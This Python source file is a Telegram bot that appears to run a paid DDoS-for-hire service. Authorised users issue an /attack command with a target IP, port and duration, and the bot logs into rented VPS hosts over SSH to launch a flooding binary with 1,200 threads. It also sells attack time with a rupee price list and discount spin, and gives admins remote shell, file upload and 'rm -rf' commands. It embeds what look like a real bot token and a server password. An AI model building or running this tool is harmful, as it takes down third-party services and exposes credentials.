import random
import threading
import paramiko
import json
import requests
import time
import os
from datetime import datetime

TOKEN = "7851009899:AAGdX4Bn2t8pMUKW0hNN34e8xTUTjqgYbMQ"  # 🔥 Replace with your bot token
API_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_IDS = [7962308718]  # 🔥 Replace with your Admin IDs
CONFIG_FILE = "config.json"

# Global variables for configuration
DEFAULT_TIME_DURATION = 240  # Default attack duration in seconds
DEFAULT_PACKET_SIZE = 1020    # Default packet size
DEFAULT_THREADS = 1200       # Default number of threads
PRICE_PER_ATTACK = 10        # Price per attack in USD
DISCOUNT_RATE = 0.1          # 10% discount rate

# Global variable to track total packet size
TOTAL_PACKET_SIZE = 0

# Dictionary to store temporary data for file uploads
user_data = {}

# Global variable to store bot start time
BOT_START_TIME = None

def generate_config_file():
    # Default configuration
    default_config = {
        "VPS_LIST": [
            {
                "ip": "172.232.132.246",  # Replace with your default VPS IP
                "user": "master_dzxcjruhqw",       # Replace with your default VPS username
                "password": "rXwj7VhPJ3Az",  # Replace with your default VPS password
                "busy": False  # Initialize as not busy
            }
        ]
    }

    # Check if config.json exists
    if not os.path.exists("config.json"):
        # Create the file and write default configuration
        with open("config.json", "w") as file:
            json.dump(default_config, file, indent=4)
        print("✅ config.json created with default values.")
    else:
        print("⚠️ config.json already exists. No changes were made.")

# Call the function to generate the config file
generate_config_file()

def save_config():
    """Save the configuration to the config file."""
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

# Load VPS details from config.json
with open(CONFIG_FILE, "r") as file:
    config = json.load(file)

# Ensure each VPS has a 'busy' key initialized to False
VPS_LIST = config["VPS_LIST"]
for vps in VPS_LIST:
    if "busy" not in vps:
        vps["busy"] = False  # Initialize 'busy' key if it doesn't exist

# Save the updated configuration (optional, to ensure 'busy' key is added to config.json)
save_config()

users = []  # 🌍 User list

def send_message(chat_id, text):
    """Send a message to the user using Telegram Bot API."""
    url = f"{API_URL}/sendMessage"
    params = {"chat_id": chat_id, "text": text}
    requests.post(url, params=params)

def get_updates(offset=None):
    """Get new updates (messages) from Telegram."""
    url = f"{API_URL}/getUpdates"
    params = {"timeout": 10, "offset": offset}
    response = requests.get(url, params=params)
    return response.json()

def check_vps_status():
    """Check the status of all VPS and send notifications for down VPS."""
    status_list = []
    failed_vps_list = []
    for vps in VPS_LIST:
        ip, user, password = vps["ip"], vps["user"], vps["password"]
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=5)
            ssh.close()
            status_list.append(f"✨🟢 `{ip}` **RUNNING** ✅")
        except:
            status_list.append(f"🔥🔴 `{ip}` **DOWN** ❌")
            failed_vps_list.append(ip)
    
    # Notify admins if any VPS is down
    if failed_vps_list:
        failed_vps_message = "\n".join([f"🔥🔴 `{ip}` **DOWN** ❌" for ip in failed_vps_list])
        for admin_id in ADMIN_IDS:
            send_message(admin_id, f"🚨 **ALERT: Some VPS are DOWN!**\n{failed_vps_message}")
    
    return "\n".join(status_list)

def handle_attack(chat_id, command):
    if chat_id not in users:
        send_message(chat_id, "🚫 **आपको अनुमति नहीं है Rahul Bhai !**")
        return

    command = command.split()
    if len(command) != 4:
        send_message(chat_id, "⚠️ **Usage:** /attack `<IP>` `<PORT>` `<TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port, time_duration = int(port), int(time_duration)
    except ValueError:
        send_message(chat_id, "❌ **𝐄𝐑𝐑𝐎𝐑:** 𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐑𝐒!")
        return

    if time_duration > 240:
        send_message(chat_id, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 120𝐬!**")
        return

    selected_vps = get_available_vps()
    if not selected_vps:
        send_message(chat_id, "🚫 **सभी VPS बिजी हैं, बाद में कोशिश करें!**")
        return

    selected_vps["busy"] = True  # ✅ VPS को बिजी मार्क कर दो
    send_message(chat_id, f"🔥 **Attack started from `{selected_vps['ip']}` on `{target}:{port}` for `{time_duration}`s** 🚀")

    attack_thread = threading.Thread(target=execute_attack, args=(selected_vps, target, port, time_duration, chat_id))
    attack_thread.start()  # ✅ अटैक को बैकग्राउंड में चलाओ

def add_user(chat_id, command):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /add_user `<USER_ID>`")
        return
    
    user_id = int(command[1])
    if user_id not in users:
        users.append(user_id)
        send_message(chat_id, f"✅ **User `{user_id}` added successfully!**")
    else:
        send_message(chat_id, "⚠️ **User पहले से मौजूद है!**")

def handle_check_vps(chat_id):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return
    
    send_message(chat_id, "⏳ **Checking VPS status...**")
    status_message = check_vps_status()
    send_message(chat_id, f"📡 **VPS STATUS:**\n{status_message}")

def add_vps(chat_id, command):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return
    
    command = command.split()
    if len(command) != 4:
        send_message(chat_id, "⚠️ **Usage:** /add_vps `<IP>` `<USER>` `<PASSWORD>`")
        return
    
    ip, user, password = command[1], command[2], command[3]
    VPS_LIST.append({"ip": ip, "user": user, "password": password, "busy": False})  # Add 'busy' key
    save_config()
    send_message(chat_id, f"✅ **VPS `{ip}` added!** ✨")

def remove_user(chat_id, command):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /remove_user `<USER_ID>`")
        return
    
    user_id = int(command[1])
    if user_id in users:
        users.remove(user_id)
        send_message(chat_id, f"✅ **User `{user_id}` removed successfully!**")
    else:
        send_message(chat_id, "⚠️ **User मौजूद नहीं है!**")

def remove_vps(chat_id, command):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return
    
    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /remove_vps `<IP>`")
        return
    
    ip = command[1]
    global VPS_LIST
    VPS_LIST = [vps for vps in VPS_LIST if vps["ip"] != ip]
    config["VPS_LIST"] = VPS_LIST
    save_config()
    send_message(chat_id, f"✅ **VPS `{ip}` removed!** ✨")

def handle_vps_list(chat_id):
    """Display the list of VPS with their details."""
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    if not VPS_LIST:
        send_message(chat_id, "❌ **No VPS found in the list!**")
        return

    vps_list_message = "📡 **VPS List:**\n"
    for index, vps in enumerate(VPS_LIST, start=1):
        ip = vps["ip"]
        user = vps["user"]
        status = "🟢 RUNNING" if not vps["busy"] else "🔴 BUSY"
        vps_list_message += f"{index}. `{ip}` (User: `{user}`) - {status}\n"

    send_message(chat_id, vps_list_message)

def get_available_vps():
    """Select an available VPS."""
    available_vps = [vps for vps in VPS_LIST if not vps["busy"]]
    return random.choice(available_vps) if available_vps else None

def execute_attack(vps, target, port, duration, chat_id):
    """Execute an attack on the target using the selected VPS."""
    global TOTAL_PACKET_SIZE
    ip, user, password = vps["ip"], vps["user"], vps["password"]
    attack_command = f"./Rahul {target} {port} {duration} {DEFAULT_PACKET_SIZE} {DEFAULT_THREADS}"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=user, password=password)

        stdin, stdout, stderr = ssh.exec_command(attack_command)
        output, error = stdout.read().decode(), stderr.read().decode()

        # Calculate packet size (example: duration * packet size * threads)
        packet_size = duration * DEFAULT_PACKET_SIZE * DEFAULT_THREADS
        TOTAL_PACKET_SIZE += packet_size

        ssh.close()
        vps["busy"] = False  # Mark VPS as free after attack

        if error:
            send_message(chat_id, f"❌ **ATTACK FAILED FROM `{ip}`** 😡")
        else:
            send_message(chat_id, f"✅ **ATTACK COMPLETED FROM `{ip}`** 💀🔥")
    except Exception as e:
        vps["busy"] = False
        send_message(chat_id, f"❌ **ERROR:** {str(e)}")


def check_uptime(vps):
    """Check the uptime of a VPS using SSH."""
    ip, user, password = vps["ip"], vps["user"], vps["password"]
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=user, password=password, timeout=5)

        # Execute the uptime command
        stdin, stdout, stderr = ssh.exec_command("uptime")
        uptime_output = stdout.read().decode().strip()
        ssh.close()

        return uptime_output
    except Exception as e:
        return f"❌ **Error checking uptime for `{ip}`:** {str(e)}"

def check_cpu_usage(vps):
    """Check the CPU usage of a VPS using SSH."""
    ip, user, password = vps["ip"], vps["user"], vps["password"]
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=user, password=password, timeout=5)

        # Execute the CPU usage command
        stdin, stdout, stderr = ssh.exec_command("top -bn1 | grep 'Cpu(s)'")
        cpu_output = stdout.read().decode().strip()
        ssh.close()

        return cpu_output
    except Exception as e:
        return f"❌ **Error checking CPU usage for `{ip}`:** {str(e)}"

def handle_uptime(chat_id, command):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /uptime `<IP>`")
        return

    ip = command[1]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    uptime = check_uptime(vps)
    send_message(chat_id, f"⏳ **Uptime for `{ip}`:**\n{uptime}")

def handle_cpu_usage(chat_id, command):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /cpu `<IP>`")
        return

    ip = command[1]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    cpu_usage = check_cpu_usage(vps)
    send_message(chat_id, f"🖥️ **CPU Usage for `{ip}`:**\n{cpu_usage}")

def handle_total_packets(chat_id):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    send_message(chat_id, f"📦 **Total Packet Size Sent:** `{TOTAL_PACKET_SIZE} bytes`")

def handle_upload_start(chat_id):
    """Step 1: Ask for the IP address of the VPS."""
    send_message(chat_id, "🔢 **Please enter the IP address of the VPS where you want to upload the file:**")
    user_data[chat_id] = {"step": "upload_ip"}

def handle_upload_ip(chat_id, ip):
    """Step 2: Save the IP address and ask for the file."""
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    # Save the IP address in user_data
    user_data[chat_id] = {"step": "upload_file", "ip": ip}
    send_message(chat_id, "📤 **Please upload the file now.**")

def handle_file_upload(chat_id, file_id, file_name):
    """Step 3: Upload the file to the specified VPS."""
    if chat_id not in user_data or user_data[chat_id].get("step") != "upload_file":
        send_message(chat_id, "❌ **Please start the upload process using the `/upload` command.**")
        return

    # Get the saved IP address
    ip = user_data[chat_id]["ip"]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        # Get file information
        file_info = requests.get(f"{API_URL}/getFile?file_id={file_id}").json()
        file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_info['result']['file_path']}"
        downloaded_file = requests.get(file_url).content

        # Save the file locally temporarily
        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)

        # Upload the file to the VPS using SCP
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Use SCP to upload the file
        scp = ssh.open_sftp()
        scp.put(file_name, f"/{file_name}")  # Upload to /root directory
        scp.close()
        ssh.close()

        # Clean up the local file
        os.remove(file_name)

        send_message(chat_id, f"✅ **File `{file_name}` uploaded successfully to `{ip}`!**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error uploading file to `{ip}`:** {str(e)}")
    finally:
        # Clear the user data
        if chat_id in user_data:
            del user_data[chat_id]

def handle_ls_command(chat_id, command):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /ls `<IP>`")
        return

    ip = command[1]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    # Execute the `ls` command on the VPS (only files, no directories)
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Execute the `ls -p | grep -v /` command to list only files
        stdin, stdout, stderr = ssh.exec_command("ls -p | grep -v /")
        ls_output = stdout.read().decode().strip()
        ssh.close()

        if ls_output:
            send_message(chat_id, f"📂 **Files on `{ip}`:**\n```\n{ls_output}\n```")
        else:
            send_message(chat_id, f"❌ **No files found on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `ls` on `{ip}`:** {str(e)}")

def handle_delete_command(chat_id, command):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    command = command.split()
    if len(command) != 3:
        send_message(chat_id, "⚠️ **Usage:** /delete `<IP>` `<file_or_directory>`")
        return

    ip = command[1]
    file_or_dir = command[2]

    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    # Execute the `rm` command on the VPS
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Execute the `rm` command
        stdin, stdout, stderr = ssh.exec_command(f"rm -rf {file_or_dir}")
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error deleting `{file_or_dir}` on `{ip}`:** {error}")
        else:
            send_message(chat_id, f"✅ **Successfully deleted `{file_or_dir}` on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `delete` on `{ip}`:** {str(e)}")

def list_users(chat_id):
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    if not users:
        send_message(chat_id, "⚠️ **कोई भी यूज़र मौजूद नहीं है!**")
        return
    
    send_message(chat_id, "👥 **Registered Users:**\n" + "\n".join(map(str, users)))
    
def handle_spin(chat_id, command):
    """Offer a discount on the price based on the number of days."""
    global DISCOUNT_RATE  # Ensure DISCOUNT_RATE is accessible

    # Parse the command to get the number of days
    command_parts = command.split()
    if len(command_parts) == 1:
        days = 1  # Default to 1 day if no argument is provided
    else:
        try:
            days = int(command_parts[1])
            if days not in [1, 2, 3]:  # Only allow 1, 2, or 3 days
                send_message(chat_id, "❌ **Invalid number of days. Use 1, 2, or 3.**")
                return
        except ValueError:
            send_message(chat_id, "❌ **Invalid input. Please specify the number of days (1, 2, or 3).**")
            return

    # Define price ranges for 1, 2, and 3 days
    price_ranges = {
        1: (100, 150),  # 1 Day: ₹100–₹150
        2: (185, 250),  # 2 Days: ₹185–₹250
        3: (250, 310),  # 3 Days: ₹250–₹310
    }

    # Simulate spinning the wheel
    send_message(chat_id, f"🎉 Spinning the Wheel for {days} Day(s)...")

    # Randomly generate a price based on the selected number of days
    min_price, max_price = price_ranges[days]
    rolling_price = random.randint(min_price, max_price)  # Random price within the range
    time.sleep(2)  # Simulate a delay for spinning

    # Display the rolling price
    send_message(chat_id, f"💰 Rolling Price: ₹{rolling_price}")

    # Calculate discount and final price
    discount = random.uniform(0.05, DISCOUNT_RATE)  # Random discount between 5% and DISCOUNT_RATE
    discounted_price = rolling_price * (1 - discount)

    # Send the final discounted price
    spin_message = (
        f"🎉 **Congratulations! You got a {discount * 100:.1f}% discount!**\n"
        f"💰 **Original Price:** ₹{rolling_price}\n"
        f"🎁 **Discounted Price:** ₹{discounted_price:.2f}"
    )
    send_message(chat_id, spin_message)
def handle_set_packet_size(chat_id, command):
    """Set the default packet size for attacks."""
    global DEFAULT_PACKET_SIZE
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /set_packet `<PACKET_SIZE>`")
        return

    try:
        packet_size = int(command[1])
        if packet_size <= 0:
            send_message(chat_id, "❌ **Packet size must be a positive integer!**")
            return

        DEFAULT_PACKET_SIZE = packet_size
        send_message(chat_id, f"✅ **Default packet size set to `{DEFAULT_PACKET_SIZE}` bytes.**")
    except ValueError:
        send_message(chat_id, "❌ **Invalid packet size. Please enter a number.**")

def handle_show(chat_id):
    """Show the current packet size, threads, and other attack parameters."""
    show_message = (
        f"🔧 **Current Configuration:**\n"
        f"- **Default Time Duration:** `{DEFAULT_TIME_DURATION}` seconds\n"
        f"- **Default Packet Size:** `{DEFAULT_PACKET_SIZE}` bytes\n"
        f"- **Default Threads:** `{DEFAULT_THREADS}`\n"
        f"- **Total Packet Size Sent:** `{TOTAL_PACKET_SIZE}` bytes"
    )
    send_message(chat_id, show_message)
    
def handle_price(chat_id):
    """Display the pricing for bot services."""
    price_message = (
        "Hello, 🤗🤗🤗! 👋\n\n"
        "💰 **Pricing for the bot services:**\n"
        "---------------------------\n"
        "• 1 Day:   120💵\n"
        "• 2 Day:   185💵\n"
        "• 4 Day:   310💵\n"
        "• 5 Day:   375💵\n"
        "• 6 Day:   410💵\n"
        "• 7 Day:   450💵\n\n"
        "🔐 For private inquiries, reach out to the owners: Rahul Bhai "
    )
    send_message(chat_id, price_message)
    
def handle_terminal(chat_id, command):
    """Execute a terminal command on a VPS."""
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    command = command.split(maxsplit=2)
    if len(command) != 3:
        send_message(chat_id, "⚠️ **Usage:** /terminal `<IP>` `<COMMAND>`")
        return

    ip, terminal_command = command[1], command[2]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        stdin, stdout, stderr = ssh.exec_command(terminal_command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error executing command on `{ip}`:**\n```\n{error}\n```")
        else:
            send_message(chat_id, f"✅ **Command output from `{ip}`:**\n```\n{output}\n```")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing command on `{ip}`:** {str(e)}")
        
def handle_set_threads(chat_id, command):
    """Set the default number of threads for attacks."""
    global DEFAULT_THREADS
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /set_threads `<THREAD_COUNT>`")
        return

    try:
        threads = int(command[1])
        if threads <= 0:
            send_message(chat_id, "❌ **Thread count must be a positive integer!**")
            return

        DEFAULT_THREADS = threads
        send_message(chat_id, f"✅ **Default thread count set to `{DEFAULT_THREADS}`.**")
    except ValueError:
        send_message(chat_id, "❌ **Invalid thread count. Please enter a number.**")
        
def handle_set_time_duration(chat_id, command):
    """Set the default time duration for attacks."""
    global DEFAULT_TIME_DURATION
    if chat_id not in ADMIN_IDS:
        send_message(chat_id, "🚫 **You do not have permission!**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /set_time `<TIME_IN_SECONDS>`")
        return

    try:
        time_duration = int(command[1])
        if time_duration <= 0:
            send_message(chat_id, "❌ **Time duration must be a positive integer!**")
            return

        DEFAULT_TIME_DURATION = time_duration
        send_message(chat_id, f"✅ **Default time duration set to `{DEFAULT_TIME_DURATION}` seconds.**")
    except ValueError:
        send_message(chat_id, "❌ **Invalid time duration. Please enter a number.**")

        

def handle_help(chat_id):
    if chat_id in ADMIN_IDS:
        # Admin help message
        help_message = """
✨ **Admin Commands:**
- `/cvps`: Check VPS status.
- `/avps <IP> <USER> <PASSWORD>`: Add a new VPS.
- `/rvps <IP>`: Remove a VPS.
- `/add <USER_ID>`: Add a user.
- `/remove <USER_ID>`: Remove a user.
- `/users`: List all users.
- `/uptime <IP>`: Check uptime of a VPS.
- `/cpu <IP>`: Check CPU usage of a VPS.
- `/total_packets`: Check total packet size sent.
- `/ls <IP>`: List files on a VPS.
- `/delete <IP> <file_or_directory>`: Delete a file or directory on a VPS.
- `/attack <IP> <PORT> <TIME>`: Start an attack.
- `/upload`: Upload a file to a VPS.
- `/vpslist`: List all VPS with their details.
- `/runningtime`: Check bot running time.
- `/terminal`: Execute terminal commands on a VPS.
- `/set_time <TIME_IN_SECONDS>`: Set default time duration.
- `/set_packet <PACKET_SIZE>`: Set default packet size.
- `/set_threads <THREAD_COUNT>`: Set default thread count.
- `/price`: Display pricing.
- `/spin`: Get a discount.
- `/show`: Show current configuration.
"""
    else:
        # Regular user help message
        help_message = """
✨ **User Commands:**
- `/attack <IP> <PORT> <TIME>`: Start an attack.
- `/price`: Display pricing.
- `/spin`: Get a discount.
"""

    send_message(chat_id, help_message)

def handle_start(chat_id):
    send_message(chat_id, "WELCOME TO Rahul Bhai  BHAI! 🔥✨\nUse `/help` to see available commands.")

def get_bot_running_time():
    """Calculate and return the bot's running time in a human-readable format."""
    global BOT_START_TIME
    if BOT_START_TIME is None:
        return "Bot has not started yet."

    current_time = datetime.now()
    running_time = current_time - BOT_START_TIME

    # Convert running time to hours, minutes, and seconds
    hours, remainder = divmod(running_time.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours} hours, {minutes} minutes, {seconds} seconds"

def handle_running_time(chat_id):
    """Send the bot's running time to the user."""
    running_time = get_bot_running_time()
    send_message(chat_id, f"⏱️ **Bot Running Time:** {running_time}")


def start_bot():
    """Start the bot and record the start time."""
    global BOT_START_TIME
    BOT_START_TIME = datetime.now()
    print("✨🚀 Bot started at:", BOT_START_TIME.strftime("%Y-%m-%d %H:%M:%S"))

def main():
    start_bot()  # Start the bot and record the start time
    offset = None
    while True:
        updates = get_updates(offset)
        if "result" in updates:
            for update in updates["result"]:
                offset = update["update_id"] + 1  # Update offset for next request
                message = update.get("message")
                if message:
                    chat_id = message["chat"]["id"]
                    text = message.get("text")

                    if text and text.startswith("/"):
                        command = text.split()[0]
                        if command == "/start":
                            handle_start(chat_id)
                        elif command == "/attack":
                            handle_attack(chat_id, text)
                        elif command == "/add":
                            add_user(chat_id, text)
                        elif command == "/cvps":
                            handle_check_vps(chat_id)
                        elif command == "/avps":
                            add_vps(chat_id, text)
                        elif command == "/remove":
                            remove_user(chat_id, text)
                        elif command == "/rvps":
                            remove_vps(chat_id, text)
                        elif command == "/vpslist":
                            handle_vps_list(chat_id)
                        elif command == "/uptime":
                            handle_uptime(chat_id, text)
                        elif command == "/cpu":
                            handle_cpu_usage(chat_id, text)
                        elif command == "/total_packets":
                            handle_total_packets(chat_id)
                        elif command == "/upload":
                            handle_upload_start(chat_id)
                        elif command == "/ls":
                            handle_ls_command(chat_id, text)
                        elif command == "/delete":
                            handle_delete_command(chat_id, text)
                        elif command == "/users":
                            list_users(chat_id)
                        elif command == "/help":
                            handle_help(chat_id)
                        elif command == "/runningtime":
                            handle_running_time(chat_id)
                        elif command == "/terminal":
                            handle_terminal(chat_id, text)
                        elif command == "/set_time":
                            handle_set_time_duration(chat_id, text)
                        elif command == "/set_packet":
                            handle_set_packet_size(chat_id, text)
                        elif command == "/set_threads":
                            handle_set_threads(chat_id, text)
                        elif command == "/price":
                            handle_price(chat_id)
                        elif command == "/spin":
                            handle_spin(chat_id, text)
                        elif command == "/show":
                            handle_show(chat_id)
                        else:
                            send_message(chat_id, "❌ **Unknown command. Use `/help` to see available commands.**")
                    elif "document" in message:
                        # Handle file uploads
                        file_id = message["document"]["file_id"]
                        file_name = message["document"]["file_name"]
                        handle_file_upload(chat_id, file_id, file_name)
                    elif chat_id in user_data and user_data[chat_id].get("step") == "upload_ip":
                        # Handle IP address input for file upload
                        handle_upload_ip(chat_id, text)
        time.sleep(1)  # Sleep to avoid spamming the API

if __name__ == "__main__":
    main()
    


